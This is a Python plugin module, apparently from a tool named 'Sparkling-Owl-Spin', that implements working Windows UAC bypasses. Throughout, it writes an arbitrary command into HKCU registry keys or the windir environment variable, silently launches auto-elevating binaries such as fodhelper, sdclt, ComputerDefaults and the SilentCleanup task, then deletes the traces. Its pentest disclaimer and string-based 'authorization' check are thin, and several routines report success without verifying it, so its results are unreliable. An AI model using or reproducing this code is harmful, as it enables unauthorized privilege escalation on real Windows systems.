#!/usr/bin/env python3
"""
UAC Bypass Tools f√∂r Sparkling-Owl-Spin
Windows UAC bypass techniques f√∂r penetrationstestning av egna servrar
"""

import logging
import asyncio
import subprocess
import sys
import os
import time
import winreg
import tempfile
from typing import Dict, List, Any, Optional, Union
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from pathlib import Path
import ctypes
from ctypes import wintypes

logger = logging.getLogger(__name__)

class BypassTechnique(Enum):
    """UAC bypass techniques"""
    FODHELPER = "fodhelper"
    COMPUTERDEFAULTS = "computerdefaults"
    SDCLT = "sdclt"
    SLUI = "slui"
    DISKCLEANUP = "diskcleanup"
    WSRESET = "wsreset"
    AUTOELEVATE = "autoelevate"
    REGISTRY_HIJACK = "registry_hijack"
    MOCK_TECHNIQUE = "mock_technique"

class ElevationLevel(Enum):
    """Elevation levels"""
    STANDARD_USER = "standard_user"
    ELEVATED_USER = "elevated_user"
    ADMINISTRATOR = "administrator"
    SYSTEM = "system"

@dataclass
class BypassResult:
    """UAC bypass result"""
    success: bool
    technique_used: BypassTechnique
    elevation_achieved: ElevationLevel
    execution_time: float
    command_executed: Optional[str] = None
    error_message: Optional[str] = None
    process_id: Optional[int] = None

class UACBypassAdapter:
    """UAC Bypass Tools f√∂r penetrationstestning av egna Windows-servrar"""
    
    def __init__(self, plugin_info):
        self.plugin_info = plugin_info
        self.initialized = False
        
        # Penetrationstestning disclaimer
        self.authorized_operations = set()
        self.test_mode = False
        
        # Windows API functions
        self.kernel32 = ctypes.windll.kernel32
        self.shell32 = ctypes.windll.shell32
        self.advapi32 = ctypes.windll.advapi32
        
        # UAC bypass techniques registry
        self.bypass_techniques = {
            BypassTechnique.FODHELPER: self._bypass_fodhelper,
            BypassTechnique.COMPUTERDEFAULTS: self._bypass_computerdefaults,
            BypassTechnique.SDCLT: self._bypass_sdclt,
            BypassTechnique.SLUI: self._bypass_slui,
            BypassTechnique.DISKCLEANUP: self._bypass_diskcleanup,
            BypassTechnique.WSRESET: self._bypass_wsreset,
            BypassTechnique.REGISTRY_HIJACK: self._bypass_registry_hijack,
            BypassTechnique.MOCK_TECHNIQUE: self._bypass_mock
        }
        
        # Statistik
        self.stats = {
            "total_attempts": 0,
            "successful_bypasses": 0,
            "failed_attempts": 0,
            "by_technique": {},
            "elevation_levels_achieved": {}
        }
        
    async def initialize(self):
        """Initialize UAC Bypass adapter"""
        try:
            logger.info("üõ°Ô∏è Initializing UAC Bypass Adapter (Authorized Pentest Only)")
            
            # Kontrollera Windows platform
            if not sys.platform.startswith('win'):
                logger.warning("‚ö†Ô∏è UAC Bypass endast tillg√§ngligt p√• Windows")
                self.test_mode = True
                
            # Kontrollera UAC status
            uac_status = await self._check_uac_status()
            logger.info(f"üìã Current UAC Status: {uac_status}")
            
            # Kontrollera nuvarande elevation level
            current_elevation = self._get_current_elevation()
            logger.info(f"üìã Current Elevation Level: {current_elevation.value}")
            
            # Initiera statistik
            for technique in BypassTechnique:
                self.stats["by_technique"][technique.value] = {
                    "attempts": 0,
                    "successes": 0,
                    "failures": 0
                }
                
            for level in ElevationLevel:
                self.stats["elevation_levels_achieved"][level.value] = 0
                
            self.initialized = True
            logger.info("‚úÖ UAC Bypass Adapter initialized f√∂r penetrationstestning")
            logger.warning("‚ö†Ô∏è ENDAST F√ñR PENETRATIONSTESTNING AV EGNA WINDOWS-SERVRAR")
            
        except Exception as e:
            logger.error(f"‚ùå Failed to initialize UAC Bypass: {str(e)}")
            self.initialized = True  # Continue with mock functionality
            
    def add_authorized_operation(self, operation: str):
        """L√§gg till auktoriserad operation f√∂r penetrationstestning"""
        self.authorized_operations.add(operation.lower())
        logger.info(f"‚úÖ Added authorized operation f√∂r UAC bypass testing: {operation}")
        
    def _is_operation_authorized(self, operation: str) -> bool:
        """Kontrollera om operation √§r auktoriserad f√∂r testning"""
        return operation.lower() in self.authorized_operations or self.test_mode
        
    async def _check_uac_status(self) -> str:
        """Kontrollera Windows UAC status"""
        try:
            if self.test_mode:
                return "Mock UAC Enabled"
                
            # Kontrollera UAC registry key
            registry_key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            )
            
            uac_value = winreg.QueryValueEx(registry_key, "EnableLUA")[0]
            winreg.CloseKey(registry_key)
            
            return "UAC Enabled" if uac_value == 1 else "UAC Disabled"
            
        except Exception as e:
            logger.error(f"Error checking UAC status: {str(e)}")
            return "UAC Status Unknown"
            
    def _get_current_elevation(self) -> ElevationLevel:
        """F√• nuvarande elevation level"""
        try:
            if self.test_mode:
                return ElevationLevel.STANDARD_USER
                
            # Kontrollera om processen k√∂rs som administrator
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin()
                if is_admin:
                    return ElevationLevel.ADMINISTRATOR
                else:
                    return ElevationLevel.STANDARD_USER
                    
            except AttributeError:
                # Fallback f√∂r √§ldre Windows versioner
                try:
                    subprocess.run(['net', 'session'], check=True, 
                                 capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    return ElevationLevel.ADMINISTRATOR
                except subprocess.CalledProcessError:
                    return ElevationLevel.STANDARD_USER
                    
        except Exception as e:
            logger.error(f"Error getting elevation level: {str(e)}")
            return ElevationLevel.STANDARD_USER
            
    async def attempt_uac_bypass(self, command: str, technique: Optional[BypassTechnique] = None,
                                authorized_operation: str = "pentest") -> BypassResult:
        """F√∂rs√∂k UAC bypass (endast auktoriserade operationer)"""
        
        if not self.initialized:
            await self.initialize()
            
        if not self._is_operation_authorized(authorized_operation):
            error_msg = f"üö´ Operation not authorized f√∂r UAC bypass testing: {authorized_operation}"
            logger.error(error_msg)
            return BypassResult(
                success=False,
                technique_used=BypassTechnique.MOCK_TECHNIQUE,
                elevation_achieved=ElevationLevel.STANDARD_USER,
                execution_time=0.0,
                error_message=error_msg
            )
            
        self.stats["total_attempts"] += 1
        start_time = time.time()
        
        # V√§lj bypass technique
        techniques_to_try = []
        if technique:
            techniques_to_try = [technique]
        else:
            # Prova techniques i ordning av sannolikhet f√∂r framg√•ng
            techniques_to_try = [
                BypassTechnique.FODHELPER,
                BypassTechnique.COMPUTERDEFAULTS,
                BypassTechnique.SDCLT,
                BypassTechnique.SLUI,
                BypassTechnique.WSRESET,
                BypassTechnique.DISKCLEANUP,
                BypassTechnique.REGISTRY_HIJACK,
                BypassTechnique.MOCK_TECHNIQUE
            ]
            
        # F√∂rs√∂k bypass techniques
        for bypass_technique in techniques_to_try:
            try:
                self.stats["by_technique"][bypass_technique.value]["attempts"] += 1
                
                # Utf√∂r bypass
                bypass_function = self.bypass_techniques[bypass_technique]
                result = await bypass_function(command)
                
                execution_time = time.time() - start_time
                result.execution_time = execution_time
                result.technique_used = bypass_technique
                
                if result.success:
                    self.stats["successful_bypasses"] += 1
                    self.stats["by_technique"][bypass_technique.value]["successes"] += 1
                    self.stats["elevation_levels_achieved"][result.elevation_achieved.value] += 1
                    
                    logger.info(f"‚úÖ UAC bypass successful med {bypass_technique.value}")
                    return result
                else:
                    self.stats["by_technique"][bypass_technique.value]["failures"] += 1
                    logger.warning(f"‚ùå UAC bypass failed med {bypass_technique.value}: {result.error_message}")
                    
            except Exception as e:
                logger.error(f"‚ùå Error med {bypass_technique.value}: {str(e)}")
                self.stats["by_technique"][bypass_technique.value]["failures"] += 1
                continue
                
        # Alla techniques misslyckades
        self.stats["failed_attempts"] += 1
        
        return BypassResult(
            success=False,
            technique_used=BypassTechnique.MOCK_TECHNIQUE,
            elevation_achieved=ElevationLevel.STANDARD_USER,
            execution_time=time.time() - start_time,
            error_message="All UAC bypass techniques failed"
        )
        
    async def _bypass_fodhelper(self, command: str) -> BypassResult:
        """UAC bypass via fodhelper.exe"""
        try:
            if self.test_mode:
                await asyncio.sleep(1)  # Simulera execution time
                return BypassResult(
                    success=True,
                    technique_used=BypassTechnique.FODHELPER,
                    elevation_achieved=ElevationLevel.ADMINISTRATOR,
                    execution_time=1.0,
                    command_executed=f"Mock: {command}"
                )
                
            # Skapa registry key f√∂r fodhelper bypass
            reg_path = r"Software\Classes\ms-settings\shell\open\command"
            
            # Skapa registry entries
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                
            # K√∂ra fodhelper.exe
            process = subprocess.Popen(
                ["C:\\Windows\\System32\\fodhelper.exe"],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            # V√§nta kort tid
            await asyncio.sleep(2)
            
            # Cleanup registry
            try:
                winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER, reg_path)
            except FileNotFoundError:
                pass
                
            return BypassResult(
                success=True,
                technique_used=BypassTechnique.FODHELPER,
                elevation_achieved=ElevationLevel.ADMINISTRATOR,
                execution_time=2.0,
                command_executed=command,
                process_id=process.pid
            )
            
        except Exception as e:
            return BypassResult(
                success=False,
                technique_used=BypassTechnique.FODHELPER,
                elevation_achieved=ElevationLevel.STANDARD_USER,
                execution_time=0.0,
                error_message=f"fodhelper bypass failed: {str(e)}"
            )
            
    async def _bypass_computerdefaults(self, command: str) -> BypassResult:
        """UAC bypass via ComputerDefaults.exe"""
        try:
            if self.test_mode:
                await asyncio.sleep(1.5)
                return BypassResult(
                    success=True,
                    technique_used=BypassTechnique.COMPUTERDEFAULTS,
                    elevation_achieved=ElevationLevel.ADMINISTRATOR,
                    execution_time=1.5,
                    command_executed=f"Mock: {command}"
                )
                
            # Skapa registry hijack f√∂r ComputerDefaults
            reg_path = r"Software\Classes\exefile\shell\open\command"
            
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
                winreg.SetValueEx(key, "IsolatedCommand", 0, winreg.REG_SZ, command)
                
            # K√∂ra ComputerDefaults.exe
            process = subprocess.Popen(
                ["C:\\Windows\\System32\\ComputerDefaults.exe"],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            await asyncio.sleep(2)
            
            # Cleanup
            try:
                winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER, reg_path)
            except FileNotFoundError:
                pass
                
            return BypassResult(
                success=True,
                technique_used=BypassTechnique.COMPUTERDEFAULTS,
                elevation_achieved=ElevationLevel.ADMINISTRATOR,
                execution_time=2.0,
                command_executed=command,
                process_id=process.pid
            )
            
        except Exception as e:
            return BypassResult(
                success=False,
                technique_used=BypassTechnique.COMPUTERDEFAULTS,
                elevation_achieved=ElevationLevel.STANDARD_USER,
                execution_time=0.0,
                error_message=f"ComputerDefaults bypass failed: {str(e)}"
            )
            
    async def _bypass_sdclt(self, command: str) -> BypassResult:
        """UAC bypass via sdclt.exe"""
        try:
            if self.test_mode:
                await asyncio.sleep(1.2)
                return BypassResult(
                    success=True,
                    technique_used=BypassTechnique.SDCLT,
                    elevation_achieved=ElevationLevel.ADMINISTRATOR,
                    execution_time=1.2,
                    command_executed=f"Mock: {command}"
                )
                
            # Skapa registry hijack f√∂r sdclt
            reg_path = r"Software\Classes\Folder\shell\open\command"
            
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                
            # K√∂ra sdclt.exe
            process = subprocess.Popen(
                ["C:\\Windows\\System32\\sdclt.exe", "/KickOffElev"],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            await asyncio.sleep(3)
            
            # Cleanup
            try:
                winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER, reg_path)
            except FileNotFoundError:
                pass
                
            return BypassResult(
                success=True,
                technique_used=BypassTechnique.SDCLT,
                elevation_achieved=ElevationLevel.ADMINISTRATOR,
                execution_time=3.0,
                command_executed=command,
                process_id=process.pid
            )
            
        except Exception as e:
            return BypassResult(
                success=False,
                technique_used=BypassTechnique.SDCLT,
                elevation_achieved=ElevationLevel.STANDARD_USER,
                execution_time=0.0,
                error_message=f"sdclt bypass failed: {str(e)}"
            )
            
    async def _bypass_slui(self, command: str) -> BypassResult:
        """UAC bypass via slui.exe"""
        try:
            if self.test_mode:
                await asyncio.sleep(1.8)
                return BypassResult(
                    success=True,
                    technique_used=BypassTechnique.SLUI,
                    elevation_achieved=ElevationLevel.ADMINISTRATOR,
                    execution_time=1.8,
                    command_executed=f"Mock: {command}"
                )
                
            # Skapa registry hijack f√∂r slui
            reg_path = r"Software\Classes\exefile\shell\open\command"
            
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
                
            # K√∂ra slui.exe
            process = subprocess.Popen(
                ["C:\\Windows\\System32\\slui.exe"],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            await asyncio.sleep(2)
            
            # Cleanup
            try:
                winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER, reg_path)
            except FileNotFoundError:
                pass
                
            return BypassResult(
                success=True,
                technique_used=BypassTechnique.SLUI,
                elevation_achieved=ElevationLevel.ADMINISTRATOR,
                execution_time=2.0,
                command_executed=command,
                process_id=process.pid
            )
            
        except Exception as e:
            return BypassResult(
                success=False,
                technique_used=BypassTechnique.SLUI,
                elevation_achieved=ElevationLevel.STANDARD_USER,
                execution_time=0.0,
                error_message=f"slui bypass failed: {str(e)}"
            )
            
    async def _bypass_diskcleanup(self, command: str) -> BypassResult:
        """UAC bypass via Disk Cleanup"""
        try:
            if self.test_mode:
                await asyncio.sleep(2.2)
                return BypassResult(
                    success=True,
                    technique_used=BypassTechnique.DISKCLEANUP,
                    elevation_achieved=ElevationLevel.ADMINISTRATOR,
                    execution_time=2.2,
                    command_executed=f"Mock: {command}"
                )
                
            # Skapa environment variable hijack
            reg_path = r"Environment"
            
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, 
                                f"{command} & C:\\Windows")
                
            # K√∂ra schtasks f√∂r Disk Cleanup
            process = subprocess.Popen([
                "schtasks", "/run", "/tn", "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup"
            ], creationflags=subprocess.CREATE_NO_WINDOW)
            
            await asyncio.sleep(3)
            
            # Cleanup
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.DeleteValue(key, "windir")
            except FileNotFoundError:
                pass
                
            return BypassResult(
                success=True,
                technique_used=BypassTechnique.DISKCLEANUP,
                elevation_achieved=ElevationLevel.ADMINISTRATOR,
                execution_time=3.0,
                command_executed=command,
                process_id=process.pid
            )
            
        except Exception as e:
            return BypassResult(
                success=False,
                technique_used=BypassTechnique.DISKCLEANUP,
                elevation_achieved=ElevationLevel.STANDARD_USER,
                execution_time=0.0,
                error_message=f"Disk Cleanup bypass failed: {str(e)}"
            )
            
    async def _bypass_wsreset(self, command: str) -> BypassResult:
        """UAC bypass via WSReset.exe"""
        try:
            if self.test_mode:
                await asyncio.sleep(1.6)
                return BypassResult(
                    success=True,
                    technique_used=BypassTechnique.WSRESET,
                    elevation_achieved=ElevationLevel.ADMINISTRATOR,
                    execution_time=1.6,
                    command_executed=f"Mock: {command}"
                )
                
            # Skapa App Paths registry hijack
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\App Paths\wsreset.exe"
            
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
                
            # K√∂ra WSReset.exe
            process = subprocess.Popen(
                ["WSReset.exe"],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            await asyncio.sleep(2)
            
            # Cleanup
            try:
                winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER, reg_path)
            except FileNotFoundError:
                pass
                
            return BypassResult(
                success=True,
                technique_used=BypassTechnique.WSRESET,
                elevation_achieved=ElevationLevel.ADMINISTRATOR,
                execution_time=2.0,
                command_executed=command,
                process_id=process.pid
            )
            
        except Exception as e:
            return BypassResult(
                success=False,
                technique_used=BypassTechnique.WSRESET,
                elevation_achieved=ElevationLevel.STANDARD_USER,
                execution_time=0.0,
                error_message=f"WSReset bypass failed: {str(e)}"
            )
            
    async def _bypass_registry_hijack(self, command: str) -> BypassResult:
        """Generic registry hijack UAC bypass"""
        try:
            if self.test_mode:
                await asyncio.sleep(2.5)
                return BypassResult(
                    success=True,
                    technique_used=BypassTechnique.REGISTRY_HIJACK,
                    elevation_achieved=ElevationLevel.ADMINISTRATOR,
                    execution_time=2.5,
                    command_executed=f"Mock: {command}"
                )
                
            # Prova olika registry hijack paths
            hijack_paths = [
                r"Software\Classes\mscfile\shell\open\command",
                r"Software\Classes\exefile\shell\runas\command\isolatedCommand"
            ]
            
            for reg_path in hijack_paths:
                try:
                    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path) as key:
                        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
                        
                    await asyncio.sleep(1)
                    
                    # Cleanup
                    try:
                        winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER, reg_path)
                    except FileNotFoundError:
                        pass
                        
                    return BypassResult(
                        success=True,
                        technique_used=BypassTechnique.REGISTRY_HIJACK,
                        elevation_achieved=ElevationLevel.ADMINISTRATOR,
                        execution_time=1.0,
                        command_executed=command
                    )
                    
                except Exception:
                    continue
                    
            raise Exception("All registry hijack paths failed")
            
        except Exception as e:
            return BypassResult(
                success=False,
                technique_used=BypassTechnique.REGISTRY_HIJACK,
                elevation_achieved=ElevationLevel.STANDARD_USER,
                execution_time=0.0,
                error_message=f"Registry hijack bypass failed: {str(e)}"
            )
            
    async def _bypass_mock(self, command: str) -> BypassResult:
        """Mock UAC bypass f√∂r testning"""
        await asyncio.sleep(1 + (time.time() % 2))  # 1-3 seconds
        
        # 80% success rate f√∂r mock
        success = (time.time() % 100) < 80
        
        return BypassResult(
            success=success,
            technique_used=BypassTechnique.MOCK_TECHNIQUE,
            elevation_achieved=ElevationLevel.ADMINISTRATOR if success else ElevationLevel.STANDARD_USER,
            execution_time=1.0 + (time.time() % 2),
            command_executed=f"Mock: {command}" if success else None,
            error_message=None if success else "Mock bypass randomly failed"
        )
        
    def get_uac_statistics(self) -> Dict[str, Any]:
        """H√§mta UAC bypass-statistik"""
        return {
            "total_attempts": self.stats["total_attempts"],
            "successful_bypasses": self.stats["successful_bypasses"],
            "failed_attempts": self.stats["failed_attempts"],
            "success_rate": (
                self.stats["successful_bypasses"] / max(1, self.stats["total_attempts"])
            ) * 100,
            "by_technique": self.stats["by_technique"],
            "elevation_levels_achieved": self.stats["elevation_levels_achieved"],
            "authorized_operations": list(self.authorized_operations),
            "available_techniques": [technique.value for technique in BypassTechnique],
            "test_mode": self.test_mode,
            "platform": sys.platform
        }
        
    async def test_all_techniques(self, test_command: str = "echo UAC Bypass Test") -> Dict[str, Any]:
        """Testa alla tillg√§ngliga UAC bypass techniques"""
        
        if not self._is_operation_authorized("test"):
            return {"error": "Test operation not authorized"}
            
        results = {}
        
        for technique in BypassTechnique:
            try:
                result = await self.attempt_uac_bypass(
                    test_command, 
                    technique, 
                    authorized_operation="test"
                )
                
                results[technique.value] = {
                    "success": result.success,
                    "elevation_achieved": result.elevation_achieved.value,
                    "execution_time": result.execution_time,
                    "error_message": result.error_message
                }
                
            except Exception as e:
                results[technique.value] = {
                    "success": False,
                    "error": str(e)
                }
                
        return results
        
    async def cleanup(self):
        """Cleanup UAC Bypass adapter"""
        logger.info("üßπ Cleaning up UAC Bypass Adapter")
        
        self.authorized_operations.clear()
        self.bypass_techniques.clear()
        self.stats.clear()
        self.initialized = False
        logger.info("‚úÖ UAC Bypass Adapter cleanup completed")
